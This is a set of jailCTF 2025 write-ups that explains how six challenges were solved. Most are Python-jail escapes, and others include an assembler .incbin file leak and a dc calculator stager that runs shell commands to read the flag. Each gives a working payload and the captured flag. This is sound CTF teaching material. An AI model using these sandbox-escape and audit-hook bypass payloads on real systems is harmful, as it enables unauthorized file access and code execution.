# Challenge: sanity 

Category: social / sanity
Author: jailctf org team

Summary:
The flag is embedded in the server rules. The visible message is obfuscated with repeated characters. The rules instruct you to right-click the first message and use Copy Text. That action reveals the hidden flag text.

Key insight:
Discord’s Copy Text copies the raw message contents. Obfuscation intended for humans is preserved when copying. The flag is present in the copied text even if the message looks noisy.

Steps to solve:
Join the Discord server -> Open the rules channel -> Right-click the first message -> Choose Copy Text -> Paste into a text editor -> Scan the pasted content for the flag pattern jail{...}

Flag:
```
jail{welcome_to_jailctf_2025!!!}
```

<img width="1466" height="350" alt="image" src="https://github.com/user-attachments/assets/c9939ebe-9a29-4657-8ef8-16b5e62dca3a" />


<img width="1132" height="528" alt="image" src="https://github.com/user-attachments/assets/d9d5ff1d-dad3-4516-b297-0c795e474a05" />

______

# Challenge: blindness 

Category: pyjail
Author: @helloperson

Problem summary:
__builtins__ is emptied. No print, no open, no helpers.
sys.stdout is closed. Normal output is invisible.
flag is present in the eval scope

Key insight:
Tracebacks and error messages are written to stderr, which is still open. If we cause an exception whose message contains the flag value, the flag will be printed to stderr and thus visible to the attacker.
Exploit:
We need an expression that evaluates flag then causes an exception that includes the evaluated value in its error message. A dictionary lookup fits:

Payload:
{}[flag]
Why this works:

Python evaluates flag to the flag string.
{} is an empty dict. Attempting {}[flag] looks up the flag string as a key.
That raises KeyError: '<flag_string>'. The KeyError message contains the key value quoted.
The traceback is emitted to stderr, so we see the flag even though stdout is closed and builtins are disabled.
Example result (illustrative):
```Traceback (most recent call last):
  File "<string>", line 1, in <module>
KeyError: 'jail{stderr_leak_5fd787f079eb69e}'
```
Alternatives considered:
Causing other exceptions that display values. Many type/index errors do not include the offending value.
Complex attribute/class introspection can work but is unnecessary here. The empty-dict lookup is the simplest and most reliable.
Flag:
`jail{stderr_leak_5fd787f079eb69e}`
<img width="1786" height="328" alt="image" src="https://github.com/user-attachments/assets/e3d3b92b-6d89-4d0e-8592-e4ead8f4ce5b" />
____________
# Challenge: ASMaaSassembly 

Category: pwn / asm
Author: @lydxn

Problem:
The service does not execute shellcode. It only assembles input and prints the resulting bytes as hex. The goal is to exfiltrate flag.txt.

Key insight:
The GNU assembler supports .incbin to embed raw file bytes into the assembled output. The assembler runs in the jail where flag.txt is reachable. The service prints assembled bytes as hex. Embedding the flag directly in the output leaks it.

Exploit:
Send this as input:
`.incbin "flag.txt"`

Server response (hex snippet):
```Compiled shellcode to X86!
6a 61 69 6c 7b 79 65 61 68 5f 6a 75 73 74 5f 69 6e 63 6c 75 64 65 5f 66 6c 61 67 2e 74 78 74 5f 6c 6f 6c 7d 0a
```
Convert the hex to raw bytes then to ASCII:
python3 -c "print(bytes.fromhex('6a 61 69 6c 7b 79 65 61 68 5f 6a 75 73 74 5f 69 6e 63 6c 75 64 65 5f 66 6c 61 67 2e 74 78 74 5f 6c 6f 6c 7d 0a').decode())"
Flag:
`jail{yeah_just_include_flag.txt_lol}`

<img width="2176" height="174" alt="image" src="https://github.com/user-attachments/assets/10ec3891-fc54-4bfe-bdc1-c98c0c35c94d" />

____________

# computer-monitor (pyjail)

## Challenge summary

You’re dropped into a Python REPL-like jail. Whatever you type is `compile`d and then executed **with a sys.monitoring hook that kills the process on any CALL or BRANCH**. Concretely, the jail:

* compiles your input to a code object `code`
* enables monitoring only for `BRANCH` and `CALL` events **on that code object**
* registers a callback `exit_hook = lambda *a: _exit(0)` for both events
* executes your code with `exec(code, {}, {})` 

A local `flag.txt` exists (on remote it holds the real flag). 

## Root cause

Inside `exit_hook`, the name `_exit` is a **global lookup** performed at function runtime. Since monitoring is set **only** for `BRANCH` and `CALL` on your `code` object, you can do operations that are neither a call nor a branch (e.g., attribute/subscript assignments) to **rebind the global `_exit`** in the `__main__` module **before** triggering any monitored event. When the first monitored event fires, the callback tries to run `_exit(0)`—but now `_exit` points to something harmless.
Key details from the jail code: `sm.set_local_events(2, code, sm.events.BRANCH + sm.events.CALL)` and `exit_hook = lambda *a: _exit(0)` followed by `sm.register_callback(..., exit_hook)`. 

## Exploit payload
Minimal one-liner:
```py
import sys; sys.modules['__main__'].__dict__['_exit']=int; print(open('flag.txt').read())
```

Why it works:

* `import sys` + dictionary assignment don’t produce Python **CALL**/**BRANCH** in your code object, so no hook yet.
* You rebind `_exit` in `__main__` to `int` (any callable is fine).
* The first actual call (`open` or `print`) triggers the monitor; it invokes `exit_hook`, which now calls your harmless `_exit` instead of `os._exit`, and execution continues, letting you read the flag. 

## Takeaways

* Python’s `sys.monitoring` hooks here only watch **CALL/BRANCH** on the specific user code object; mutating module globals via attribute/subscript ops slips past.
* Functions resolve globals at **call time**; rebinding those names is a classic way to defang preinstalled callbacks in pyjails that don’t block attribute access. 

running the payload shows this
<img width="2326" height="182" alt="image" src="https://github.com/user-attachments/assets/98a15be8-9533-426d-9d9a-ff4d01ca6d85" />

________________________
Challenge: calc 
Category: pyjail
Author: @quasarobizzaro
Based on: “calc” for iCTF 2024 by maple3142

Problem summary
A “calculator” reads an input string and:

Gate: accepts inputs that start with [0-9+\-*/], length ≤ 75, and rejects spaces/underscores.
Eval: eval(expr) runs under a strict audit hook that calls os._exit on sensitive actions.
Print: after eval returns, the code rebinds the exit it closed over, effectively neutering the hook, then print(result) is called.

Net effect: only the prefix must look like math; after that it’s real Python. And any dangerous action that happens during printing escapes the audit hook.

Key insights
The regex uses a prefix match, not a full match → we can start with 0, and then write arbitrary Python.
The audit hook is active only during eval; it’s disabled before print.
Printing a custom object calls its __repr__/__str__. If those methods call open('flag.txt').read(), the file read happens after the hook is neutered.
Spaces and _ are banned, but we can use:

   
a TAB character in lambda<TAB>s:...
\x5f to build underscores at runtime (\x5f\x5frepr\x5f\x5f).

Exploit
Craft an object whose __repr__ reads the flag; return it as the second element of a tuple so print will call repr:

Payload (≤75 chars, includes a literal TAB after lambda)
0,type('',(),{'\x5f\x5frepr\x5f\x5f':lambda    s:open('flag.txt').read()})()


Why this works
0, satisfies the gate; the rest is arbitrary Python.
We dynamically create a class with __repr__ (no _ characters typed, thanks to \x5f).
Nothing dangerous runs during eval. After eval, the hook is disabled.
print(...) renders the tuple, calling our __repr__, which reads and returns the flag.

Example result:
```
Activating audit hook...
Disabling audit hook...
(0, jail{this_python_ain't_so_scary_anymore_when_defanged_73ef638f5110dc0660d01a})
```

Alternatives considered
Using __str__ instead of __repr__ also works (e.g., returning a bare object and printing it), but the tuple + __repr__ is shorter and reliably triggers during print.
Attribute/object graph tricks or eval-time reads are riskier because the hook is active during eval.

Flag
```jail{this_python_ain't_so_scary_anymore_when_defanged_73ef638f5110dc0660d01a}```
<img width="884" height="147" alt="image" src="https://github.com/user-attachments/assets/efba5b5b-59ef-4efd-abf9-b9659bd55043" />

_____________________

# Challenge: desk-calculator RCE (dc pyjail)

**Category:** pwn / jail
**Author:** (unknown, challs1.pyjail.club)

## Problem

A Python wrapper accepts one line of input and rejects anything that isn’t a letter `A–Z` or `a–y` (lowercase `z` is banned). The program writes the line to `/tmp/code.txt` and runs:

```bash
/usr/bin/dc -f /tmp/code.txt
```

The container is built on `pwn.red/jail`. During build, files land under `/srv/app`, but at runtime the jail exposes them under `/app`. The goal is to read the randomized `flag-*.txt`.

## Key insights

* In **dc**, `!` executes a shell command, and `?` reads **one more line** from stdin and executes it as dc code (a mini “stager”).
* The Python filter blocks punctuation, so we can’t type `?` or `!` directly on the first line.
* dc lets us **synthesize characters**: push a number, turn it into a one-byte string with `a`, then execute it with `x`.
* ASCII `'?'` is 63. Build 63 **mod 256** without digits using base-15 numerals and then `a`/`x`.

## Exploit

1. **First line (letters only) — build and run `?`:**

```
FiCBEax
```

Explanation:

* `F` = the digit 15; `i` sets **ibase** to 15.
* `CBE` (base-15) = 12·15² + 11·15 + 14 = **2879**; 2879 mod 256 = **63** (`'?'`).
* `a` converts 2879 → one-byte string `?`.
* `x` executes that string, so dc now **reads the next line** and executes it (filter no longer applies to that line).

2. **Second line (now punctuation allowed) — spawn shell & read flag:**

```
!pwd; ls -la /app; cat /app/flag-*.txt
```

## Proof

From my session:

<img width="767" height="382" alt="image" src="https://github.com/user-attachments/assets/d10a8d31-42bf-41c1-828f-01a3aced44da" />

## Why this works (dc notes)

* `?` — read one line from stdin and execute as dc code.
* `!` — run the rest of the line via `/bin/sh -c ...`.
* `a` — convert number → one-byte string (low 8 bits).
* `x` — execute top-of-stack string as dc program.
* Lowercase `z` (stack depth) is banned by the filter, but the above sequence doesn’t use it.

## Flag

```
jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}
```
